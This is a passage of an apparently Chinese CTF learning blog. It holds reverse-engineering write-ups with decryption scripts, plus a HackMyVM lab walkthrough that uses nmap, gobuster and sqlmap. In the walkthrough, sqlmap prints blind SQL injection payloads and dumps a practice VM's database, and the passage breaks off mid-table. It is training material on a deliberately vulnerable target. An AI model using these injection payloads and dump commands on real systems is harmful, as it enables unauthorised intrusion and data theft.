c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">RC4</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+15h] [rbp-Bh]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  init_sbox(a2);<br>  v6 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v6 )<br>      <span class="hljs-keyword">break</span>;<br>    v4 += sbox[++v3];<br>    swap(&amp;sbox[v3], &amp;sbox[v4]);<br>    a1[i] ^= sbox[(<span class="hljs-type">unsigned</span> __int8)(sbox[v3] + sbox[v4])];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>RC4 加密，好讨厌写解密算法。。。</p><p>看 wp 可以进行动调，又学到了，直接下断点</p><p><img src="https://img.dkdun.cn/v1/2024/12/0ed96784483aba17.png"></p><p>这是 <code>elf</code> 文件，所以只能远程动调，连接 kali</p><p><img src="https://img.dkdun.cn/v1/2024/12/30ea914294d8ad9b.png"></p><p>随便输入字符串，断点断在了加密函数，查看数据就是我们输入的字符串</p><p>然后找到 <code>data</code> ，把数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/0b7d89f3556bbcf9.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/4b329403b9e95b5f.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from ida_bytes import *<br>addr = <span class="hljs-number">0x55FE34CF0040</span>//s的起始地址<br>enc = [<span class="hljs-number">0xC4</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x10</span>,<br>       <span class="hljs-number">0x56</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x9C</span>,<br>       <span class="hljs-number">0x75</span>, <span class="hljs-number">0xB5</span>]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">22</span>):<br>    patch_byte(addr + i, enc[i])<br>print(<span class="hljs-string">&#x27;Done&#x27;</span>)<br></code></pre></td></tr></table></figure><p>点进 <code>run</code> 之后，s 就会有变化，然后 f9 运行又会断在与 <code>data</code> 比较的地方，这个时候可以看 <code>s</code> 的值，与之前又不一样，按 <code>a</code> 可以转化为字符串（又学到了！）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ced081c112845bbe.png"> </p><p>over~</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week1</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B01/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B01/</url>
    
    <content type="html"><![CDATA[<p>复现复现！猫猫虫真可爱捏 :)</p><span id="more"></span><h1 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h1><p>ida 打开</p><p><img src="https://img.dkdun.cn/v1/2024/12/45aba7af131703c1.png"></p><p>主要逻辑是根据输入的字符串长度，如果<code>j%3==0</code> ，那么就将输入的索引为<code>j</code> 的值减去 <code>31</code>，如果 <code>j%3==1</code>，加上<code>41</code>,如果 <code>j%3==2</code>，那么和 <code>0x55</code> 异或。然后值与 <code>buffer</code> 数组相比较，一样就成功，所以点进数组提取数据。</p><p><img src="https://img.dkdun.cn/v1/2024/12/71cd4fc66d472b65.png"></p><p>可以写出 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = [<span class="hljs-number">0x47</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x16</span>,<br>          <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5C</span>,<br>          <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x28</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buffer)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        buffer[i] += <span class="hljs-number">0x1f</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        buffer[i] -= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        buffer[i] ^= <span class="hljs-number">0x55</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(buffer[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h1><p>我记得之前在哪个师傅博客看到过说先看 <code>.xml</code> 文件的 <code>activity</code> 可以快速找到。</p><p>对于 apk 文件可以先拖进模拟器运行看看里面是什么样的，然后看看提示</p><p><img src="https://img.dkdun.cn/v1/2024/12/1225907047cea4d6.png"></p><p>所以查看 <code>AndroidManifest.xml</code>，看见 <code>activity</code> 只有 <code>work.pangbai.ezandroidstudy.Homo</code> 和 <code>work.pangbai.ezandroidstudy.MainActivity</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8cdfab6774a6a8c5.png"></p><p>拿到 flag1</p><p><img src="https://img.dkdun.cn/v1/2024/12/51ac9c9e7e71f1e9.png"></p><p>看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/f1ca7ebb6f9da41c.png"></p><p>在 <code>resources.arsc/res/value/string.xml</code> 找到了</p><p><img src="https://img.dkdun.cn/v1/2024/12/cdf9036f6f299c85.png"></p><p>继续看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd4cd1392593c483.png"></p><p><code>/layout/activity_main.xml</code> 里的 <code>activity_main.xml</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8fb3d0ba6b81c630.png"></p><p>查找 flag4</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd86d0f76ba83a70.png"></p><p>打开 <code>/res/raw</code> 发现目录下有个 <code>flag4.txt</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/bbfa8ee63b0b9c03.png"></p><p>flag 5</p><p><img src="https://img.dkdun.cn/v1/2024/12/6f609d03f4d2cc66.png"></p><p>需要逆向 so 层，那么将 <code>.so</code> 提取出来，可以使用<code>apktool</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d ezAndroidStudy.apk -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p> 将<code>&quot;/lib/x86_64/libezandroidstudy.so&quot;</code>丢进 ida 反编译就出来了</p><p><img src="https://img.dkdun.cn/v1/2024/12/94ea73f36dd81624.png"></p><h1 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h1><p>根据题目丢进 <code>x64dbg</code> 动调</p><p>首先查找字符串，看看有没有可以字符串，可以发现有一些 <code>flag</code> 字样</p><p><img src="https://img.dkdun.cn/v1/2024/12/c4ab9716a8f2bb1b.png"></p><p>在 <code>Decrypted flag</code> 处下个断点运行，得到结果</p><p><img src="https://img.dkdun.cn/v1/2024/12/be3f66141d6c7ac6.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/42e30da474972b02.png"></p><p>太喜欢逆向了有种做不出来但又想做的崩溃感</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Chromatic(1)</title>
    <link href="/2024/11/10/HackMyVM-1/"/>
    <url>/2024/11/10/HackMyVM-1/</url>
    
    <content type="html"><![CDATA[<p>这是 cx 师傅的渗透日记，他说感觉渗透和游戏一样简单~</p><span id="more"></span><h1 id="探寻目标主机服务"><a href="#探寻目标主机服务" class="headerlink" title="探寻目标主机服务"></a>探寻目标主机服务</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# nmap -Pn -n -sV -sC 192.168.56.15                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 21:54 EST<br>Nmap scan report for 192.168.56.15<br>Host is up (0.00066s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)<br>|_  256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>|_http-title: Chromatica|Coming Soon..... <br>MAC Address: 08:00:27:67:0D:85 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds<br>                                                 <br></code></pre></td></tr></table></figure><p>存在ssh与http服务</p><h1 id="对目标主机服务进行踩点"><a href="#对目标主机服务进行踩点" class="headerlink" title="对目标主机服务进行踩点"></a>对目标主机服务进行踩点</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><h3 id="进行目录扫描"><a href="#进行目录扫描" class="headerlink" title="进行目录扫描"></a>进行目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# gobuster dir -u http://192.168.56.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -x php,txt,html -s &quot;200,403,301&quot; -b &quot;&quot;<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:            http://192.168.56.15<br>[+] Method:         GET<br>[+] Threads:        15<br>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Status codes:   200,403,301<br>[+] User Agent:     gobuster/3.6<br>[+] Extensions:     php,txt,html<br>[+] Timeout:        10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 278]<br>/index.html           (Status: 200) [Size: 4047]<br>/.html                (Status: 403) [Size: 278]<br>/assets               (Status: 301) [Size: 315] [--&gt; http://192.168.56.15/assets/]<br>/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.15/css/]<br>/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.15/js/]<br>/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.56.15/javascript/]<br>/robots.txt           (Status: 200) [Size: 36]<br>/.html                (Status: 403) [Size: 278]<br>/.php                 (Status: 403) [Size: 278]<br>/server-status        (Status: 403) [Size: 278]<br>Progress: 882240 / 882244 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>先看一下robots.txt</p><p><img src="/2024/11/06/TestWP/M-1/1.png"></p><p>给了ua和一个新路径。</p><p><img src="/2024/11/06/TestWP/M-1/2.png"></p><p>403，应该需要加ua头</p><p><img src="/2024/11/06/TestWP/M-1/3.png"></p><p>添加后有一个框，search，可能是sql？先试试</p><p>好像无论怎样都不存在。使用curl查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# curl http://192.168.56.15/dev-porta/ -H &#x27;User-Agent: dev&#x27;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>        &lt;title&gt;Chromatica&lt;/title&gt;<br>        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>        &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>        &lt;div class=&quot;background-image&quot;&gt;&lt;/div&gt;<br>        &lt;div class=&quot;container&quot;&gt;<br>                &lt;h1&gt; Search&lt;/h1&gt;<br>                &lt;form action=&quot;search.php&quot; method=&quot;get&quot;&gt;<br>                        &lt;label for=&quot;query&quot;&gt;Chromatica&lt;/label&gt;<br>                        &lt;input type=&quot;text&quot; id=&quot;query&quot; name=&quot;city&quot; placeholder=&quot;Type a city&#x27;s name...&quot;&gt;<br>                        &lt;button type=&quot;submit&quot;&gt;Go&lt;/button&gt;<br>                &lt;/form&gt;<br>        &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>search.php。查看下。</p><p><img src="/2024/11/06/TestWP/M-1/4.png"></p><p>这样一看估计就是sql注入了。sqlmap下</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# sqlmap -u &quot;http://192.168.56.15/dev-portal/search.php?city=1&quot; -H &#x27;User-Agent: dev&#x27; --batch --dbs<br>        ___<br>       __H__<br> ___ ___[&quot;]_____ ___ ___  &#123;1.8.7#stable&#125;<br>|_ -| . [)]     | .&#x27;| . |<br>|___|_  [,]_|_|_|__,|  _|<br>      |_|V...       |_|   https://sqlmap.org<br><br>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br><br>[*] starting @ 22:05:27 /2024-11-09/<br><br>[22:05:27] [INFO] resuming back-end DBMS &#x27;mysql&#x27; <br>[22:05:27] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: city (GET)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>    Payload: city=1&#x27; OR NOT 7686=7686-- XUIb<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: city=1&#x27; AND (SELECT 6459 FROM (SELECT(SLEEP(5)))lTOD)-- bGSk<br>---<br>[22:05:27] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 22.04 (jammy)<br>web application technology: Apache 2.4.52<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br>[22:05:27] [INFO] fetching database names<br>[22:05:27] [INFO] fetching number of databases<br>[22:05:27] [INFO] resumed: 2<br>[22:05:27] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;--threads&#x27; for faster data retrieval<br>[22:05:27] [INFO] retrieved: information_schema<br>[22:05:28] [INFO] retrieved: Chromatica<br>available databases [2]:<br>[*] Chromatica<br>[*] information_schema<br><br>[22:05:29] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.15&#x27;<br><br>[*] ending @ 22:05:29 /2024-11-09/<br></code></pre></td></tr></table></figure><p>查下<code>Chromatica</code>库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# sqlmap -u &quot;http://192.168.56.15/dev-portal/search.php?city=1&quot; -H &#x27;User-Agent: dev&#x27; --batch -D Chromatica --dump<br>        ___<br>       __H__<br> ___ ___[)]_____ ___ ___  &#123;1.8.7#stable&#125;<br>|_ -| . [,]     | .&#x27;| . |<br>|___|_  [(]_|_|_|__,|  _|<br>      |_|V...       |_|   https://sqlmap.org<br><br>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br><br>[*] starting @ 22:06:10 /2024-11-09/<br><br>[22:06:10] [INFO] resuming back-end DBMS &#x27;mysql&#x27; <br>[22:06:10] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: city (GET)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>    Payload: city=1&#x27; OR NOT 7686=7686-- XUIb<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: city=1&#x27; AND (SELECT 6459 FROM (SELECT(SLEEP(5)))lTOD)-- bGSk<br>---<br>[22:06:11] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 22.04 (jammy)<br>web application technology: Apache 2.4.52<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br>[22:06:11] [INFO] fetching tables for database: &#x27;Chromatica&#x27;<br>[22:06:11] [INFO] fetching number of tables for database &#x27;Chromatica&#x27;<br>[22:06:11] [INFO] resumed: 2<br>[22:06:11] [INFO] resumed: users<br>[22:06:11] [INFO] resumed: cities<br>[22:06:11] [INFO] fetching columns for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:11] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;--threads&#x27; for faster data retrieval<br>[22:06:11] [INFO] retrieved: 4<br>[22:06:11] [INFO] retrieved: id<br>[22:06:11] [INFO] retrieved: city<br>[22:06:11] [INFO] retrieved: population<br>[22:06:11] [INFO] retrieved: postal_code<br>[22:06:12] [INFO] fetching entries for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:12] [INFO] fetching number of entries for table &#x27;cities&#x27; in database &#x27;Chromatica&#x27;<br>[22:06:12] [INFO] retrieved: 11<br>[22:06:12] [INFO] retrieved: New York City<br>[22:06:12] [INFO] retrieved: 1<br>[22:06:12] [INFO] retrieved: 8336817<br>[22:06:13] [INFO] retrieved: 10001<br>[22:06:13] [INFO] retrieved: Los Angeles<br>[22:06:13] [INFO] retrieved: 2<br>[22:06:14] [INFO] retrieved: 3979576<br>[22:06:14] [INFO] retrieved: 90001<br>[22:06:14] [INFO] retrieved: Chicago<br>[22:06:14] [INFO] retrieved: 3<br>[22:06:14] [INFO] retrieved: 2693976<br>[22:06:15] [INFO] retrieved: 60601<br>[22:06:15] [INFO] retrieved: Houston<br>[22:06:15] [INFO] retrieved: 4<br>[22:06:15] [INFO] retrieved: 2320268<br>[22:06:16] [INFO] retrieved: 77001<br>[22:06:16] [INFO] retrieved: Phoenix<br>[22:06:16] [INFO] retrieved: 5<br>[22:06:16] [INFO] retrieved: 1680992<br>[22:06:16] [INFO] retrieved: 85001<br>[22:06:17] [INFO] retrieved: Philadelphia<br>[22:06:17] [INFO] retrieved: 6<br>[22:06:17] [INFO] retrieved: 1584064<br>[22:06:17] [INFO] retrieved: 19101<br>[22:06:18] [INFO] retrieved: San Antonio<br>[22:06:18] [INFO] retrieved: 7<br>[22:06:18] [INFO] retrieved: 1547253<br>[22:06:18] [INFO] retrieved: 78201<br>[22:06:19] [INFO] retrieved: San Diego<br>[22:06:19] [INFO] retrieved: 8<br>[22:06:19] [INFO] retrieved: 1425976<br>[22:06:19] [INFO] retrieved: 92101<br>[22:06:20] [INFO] retrieved: Dallas<br>[22:06:20] [INFO] retrieved: 9<br>[22:06:20] [INFO] retrieved: 1317929<br>[22:06:20] [INFO] retrieved: 75201<br>[22:06:21] [INFO] retrieved: San Jose<br>[22:06:21] [INFO] retrieved: 10<br>[22:06:21] [INFO] retrieved: 1030119<br>[22:06:21] [INFO] retrieved: 95101<br>[22:06:22] [INFO] retrieved: Paris<br>[22:06:22] [INFO] retrieved: 11<br>[22:06:22] [INFO] retrieved: 2140526<br>[22:06:22] [INFO] retrieved: 75001<br>Database: Chromatica<br>Table: cities<br>[11 entries]<br>+----+---------------+------------+-------------+<br>| id | city          | population | postal_code |<br>+----+---------------+------------+-------------+<br>| 